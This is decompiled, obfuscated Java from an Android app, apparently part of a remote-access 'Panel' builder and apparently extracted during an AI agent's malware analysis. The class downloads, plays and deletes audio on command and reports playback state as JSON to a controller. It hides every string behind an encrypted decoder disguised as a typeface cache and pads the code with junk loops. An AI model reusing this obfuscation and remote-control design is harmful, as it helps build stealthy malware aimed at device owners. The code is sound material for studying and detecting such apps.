package v.s;

import android.content.Context;
import android.media.AudioAttributes;
import android.media.MediaPlayer;
import android.os.Handler;
import android.os.Looper;
import app.mobilex.plus.util.TypefaceCache;
import java.io.File;
import java.util.Locale;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import org.json.JSONObject;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public abstract class wbK4wnGaII4TwWEYqb {
    public static final ExecutorService D5P1xCAyuvgF;
    public static volatile boolean Ee8d2j4S9Vm5yGuR;
    public static volatile boolean JXn4Qf7zpnLjP5;
    public static final Handler b1EoSIRjJHO5;
    public static volatile MediaPlayer dDIMxZXP1V8HdM;
    public static volatile int ibVTtJUNfrGYbW;
    public static FJeKBE8bSvB9SICtl pyu8ovAipBTLYAiKab;
    public static volatile float vekpFI4d1Nc4fakF;
    public static volatile File w9sT1Swbhx3hs;
    public static volatile boolean xDyLpEZyrcKVe0;

    static {
        TypefaceCache.obtain("00020063005F008E00FF008C00C600B500260077005600B700FC00BE00CB00A20031");
        vekpFI4d1Nc4fakF = 1.0f;
        b1EoSIRjJHO5 = new Handler(Looper.getMainLooper());
        D5P1xCAyuvgF = Executors.newSingleThreadExecutor(new kl9kWElPCsw4XTIKUid1(0));
    }

    public static void D5P1xCAyuvgF() {
        FJeKBE8bSvB9SICtl fJeKBE8bSvB9SICtl = pyu8ovAipBTLYAiKab;
        if (fJeKBE8bSvB9SICtl != null) {
            b1EoSIRjJHO5.removeCallbacks(fJeKBE8bSvB9SICtl);
        }
        pyu8ovAipBTLYAiKab = null;
        try {
            MediaPlayer mediaPlayer = dDIMxZXP1V8HdM;
            if (mediaPlayer != null) {
                try {
                    if (mediaPlayer.isPlaying()) {
                        mediaPlayer.stop();
                    }
                } catch (Exception unused) {
                }
                while (Locale.getDefault().toString().length() > 999) {
                    String.valueOf(System.nanoTime());
                }
                mediaPlayer.release();
            }
        } catch (Exception unused2) {
        }
        dDIMxZXP1V8HdM = null;
        JXn4Qf7zpnLjP5 = false;
        Ee8d2j4S9Vm5yGuR = false;
        b1EoSIRjJHO5(TypefaceCache.obtain("003000620054009700E000BA00D6"));
    }

    public static void Ee8d2j4S9Vm5yGuR() {
        try {
            MediaPlayer mediaPlayer = dDIMxZXP1V8HdM;
            if (mediaPlayer == null || !Ee8d2j4S9Vm5yGuR) {
                return;
            }
            mediaPlayer.start();
            Ee8d2j4S9Vm5yGuR = false;
            JXn4Qf7zpnLjP5 = true;
            b1EoSIRjJHO5(TypefaceCache.obtain("0033007A005A009E00F900B100D5"));
            Handler handler = b1EoSIRjJHO5;
            FJeKBE8bSvB9SICtl fJeKBE8bSvB9SICtl = pyu8ovAipBTLYAiKab;
            if (fJeKBE8bSvB9SICtl != null) {
                handler.removeCallbacks(fJeKBE8bSvB9SICtl);
            }
            FJeKBE8bSvB9SICtl fJeKBE8bSvB9SICtl2 = new FJeKBE8bSvB9SICtl(0);
            pyu8ovAipBTLYAiKab = fJeKBE8bSvB9SICtl2;
            handler.postDelayed(fJeKBE8bSvB9SICtl2, 1000L);
        } catch (Exception e) {
            TypefaceCache.obtain("003100730048009200FD00BA009200A2003100640054009500AA00FF");
            e.getMessage();
        }
    }

    public static void JXn4Qf7zpnLjP5() {
        File file = w9sT1Swbhx3hs;
        if (file == null || !file.exists()) {
            ibVTtJUNfrGYbW(TypefaceCache.obtain("000D0079001B008100F900B300D700E7002F0079005A008300F500BB"));
            return;
        }
        if (Ee8d2j4S9Vm5yGuR && dDIMxZXP1V8HdM != null) {
            Ee8d2j4S9Vm5yGuR();
            return;
        }
        try {
            MediaPlayer mediaPlayer = dDIMxZXP1V8HdM;
            if (mediaPlayer != null) {
                try {
                    if (mediaPlayer.isPlaying()) {
                        mediaPlayer.stop();
                    }
                } catch (Exception unused) {
                }
                mediaPlayer.release();
            }
            MediaPlayer mediaPlayer2 = new MediaPlayer();
            mediaPlayer2.setAudioAttributes(new AudioAttributes.Builder().setUsage(1).setContentType(2).build());
            mediaPlayer2.setDataSource(file.getAbsolutePath());
            mediaPlayer2.setVolume(vekpFI4d1Nc4fakF, vekpFI4d1Nc4fakF);
            mediaPlayer2.prepare();
            mediaPlayer2.start();
            mediaPlayer2.setOnCompletionListener(new zACKG1kulHctLd());
            dDIMxZXP1V8HdM = mediaPlayer2;
            JXn4Qf7zpnLjP5 = true;
            Ee8d2j4S9Vm5yGuR = false;
            b1EoSIRjJHO5(TypefaceCache.obtain("0033007A005A009E00F900B100D5"));
            Handler handler = b1EoSIRjJHO5;
            FJeKBE8bSvB9SICtl fJeKBE8bSvB9SICtl = pyu8ovAipBTLYAiKab;
            if (fJeKBE8bSvB9SICtl != null) {
                handler.removeCallbacks(fJeKBE8bSvB9SICtl);
            }
            FJeKBE8bSvB9SICtl fJeKBE8bSvB9SICtl2 = new FJeKBE8bSvB9SICtl(0);
            pyu8ovAipBTLYAiKab = fJeKBE8bSvB9SICtl2;
            handler.postDelayed(fJeKBE8bSvB9SICtl2, 1000L);
            TypefaceCache.obtain("0013007A005A009E00F200BE00D100AC00630065004F008600E200AB00D700A3006F0036005F009200E200BE00C600AE002C00780006");
            mediaPlayer2.getDuration();
        } catch (Exception e) {
            TypefaceCache.obtain("0033007A005A009E00DC00B000D300A300260072001B008200E200AD00DD00B500790036");
            e.getMessage();
            String message = e.getMessage();
            if (message == null) {
                message = TypefaceCache.obtain("001600780050008900FF00A800DC00E7002600640049008800E2");
            }
            ibVTtJUNfrGYbW(message);
        }
    }

    public static void b1EoSIRjJHO5(String str) {
        try {
            MediaPlayer mediaPlayer = dDIMxZXP1V8HdM;
            iStgVlW5d7CQ5MhFi istgvlw5d7cq5mhfi = RWY6BVSB0XxPbw.d6c98qX7r0XzUZFibx;
            RWY6BVSB0XxPbw rWY6BVSB0XxPbw = RWY6BVSB0XxPbw.GUsyOYEIobMSb6n;
            if (rWY6BVSB0XxPbw != null) {
                JSONObject jSONObject = new JSONObject();
                jSONObject.put(TypefaceCache.obtain("0037006F004B0082"), TypefaceCache.obtain("00220063005F008E00FF008000C100B300220062004E0094"));
                jSONObject.put(TypefaceCache.obtain("00300062005A009300F5"), str);
                jSONObject.put(TypefaceCache.obtain("003300790048008E00E400B600DD00A9"), mediaPlayer != null ? mediaPlayer.getCurrentPosition() : 0);
                jSONObject.put(TypefaceCache.obtain("002700630049008600E400B600DD00A9"), mediaPlayer != null ? mediaPlayer.getDuration() : 0);
                jSONObject.put(TypefaceCache.obtain("002F0079005A008300F500BB"), xDyLpEZyrcKVe0);
                rWY6BVSB0XxPbw.H9XlUr4OeMJFiXK(jSONObject);
            }
        } catch (Exception unused) {
        }
    }

    public static void dDIMxZXP1V8HdM(Context context, String str, float f) {
        D5P1xCAyuvgF();
        vekpFI4d1Nc4fakF = f;
        b1EoSIRjJHO5(TypefaceCache.obtain("00270079004C008900FC00B000D300A3002A0078005C"));
        D5P1xCAyuvgF.execute(new A68NpXPqwTFos99nt(str, 0, context));
    }

    public static void ibVTtJUNfrGYbW(String str) {
        try {
            iStgVlW5d7CQ5MhFi istgvlw5d7cq5mhfi = RWY6BVSB0XxPbw.d6c98qX7r0XzUZFibx;
            RWY6BVSB0XxPbw rWY6BVSB0XxPbw = RWY6BVSB0XxPbw.GUsyOYEIobMSb6n;
            if (rWY6BVSB0XxPbw != null) {
                JSONObject jSONObject = new JSONObject();
                jSONObject.put(TypefaceCache.obtain("0037006F004B0082"), TypefaceCache.obtain("00220063005F008E00FF008000C100B300220062004E0094"));
                jSONObject.put(TypefaceCache.obtain("00300062005A009300F5"), TypefaceCache.obtain("002600640049008800E2"));
                jSONObject.put(TypefaceCache.obtain("002600640049008800E2"), str);
                rWY6BVSB0XxPbw.H9XlUr4OeMJFiXK(jSONObject);
            }
        } catch (Exception unused) {
        }
    }

    /* JADX WARN: Code duplicated, block: B:4:0x0006 A[PHI: r0
      0x0006: PHI (r0v4 float) = (r0v0 float), (r0v1 float) binds: [B:3:0x0004, B:6:0x000d] A[DONT_GENERATE, DONT_INLINE]] */
    public static void pyu8ovAipBTLYAiKab(float f) {
        float f2 = 0.0f;
        if (f < 0.0f) {
            f = f2;
        } else {
            f2 = 1.0f;
            if (f > 1.0f) {
                f = f2;
            }
        }
        vekpFI4d1Nc4fakF = f;
        try {
            MediaPlayer mediaPlayer = dDIMxZXP1V8HdM;
            if (mediaPlayer != null) {
                mediaPlayer.setVolume(f, f);
            }
        } catch (Exception e) {
            TypefaceCache.obtain("00300073004F00B100FF00B300C700AA00260036005E009500E200B000C000FD0063");
            e.getMessage();
        }
    }

    public static void vekpFI4d1Nc4fakF() {
        try {
            MediaPlayer mediaPlayer = dDIMxZXP1V8HdM;
            if (mediaPlayer == null || !mediaPlayer.isPlaying()) {
                return;
            }
            mediaPlayer.pause();
            Ee8d2j4S9Vm5yGuR = true;
            JXn4Qf7zpnLjP5 = false;
            b1EoSIRjJHO5(TypefaceCache.obtain("00330077004E009400F500BB"));
        } catch (Exception e) {
            TypefaceCache.obtain("00330077004E009400F500FF00D700B500310079004900DD00B0");
            e.getMessage();
        }
    }

    public static void w9sT1Swbhx3hs(Context context, String str, float f) {
        D5P1xCAyuvgF();
        xDyLpEZyrcKVe0 = false;
        try {
            File file = w9sT1Swbhx3hs;
            if (file != null) {
                file.delete();
            }
        } catch (Exception unused) {
        }
        w9sT1Swbhx3hs = null;
        vekpFI4d1Nc4fakF = f;
        ibVTtJUNfrGYbW++;
        int i = ibVTtJUNfrGYbW;
        b1EoSIRjJHO5(TypefaceCache.obtain("00270079004C008900FC00B000D300A3002A0078005C"));
        D5P1xCAyuvgF.execute(new TSNDB0Gzi30d(str, i, context, 0));
    }

    public static void xDyLpEZyrcKVe0(int i) {
        try {
            MediaPlayer mediaPlayer = dDIMxZXP1V8HdM;
            if (mediaPlayer != null) {
                mediaPlayer.seekTo(i);
            }
        } catch (Exception e) {
            TypefaceCache.obtain("00300073005E008C00C400B0009200A2003100640054009500AA00FF");
            e.getMessage();
        }
    }
}
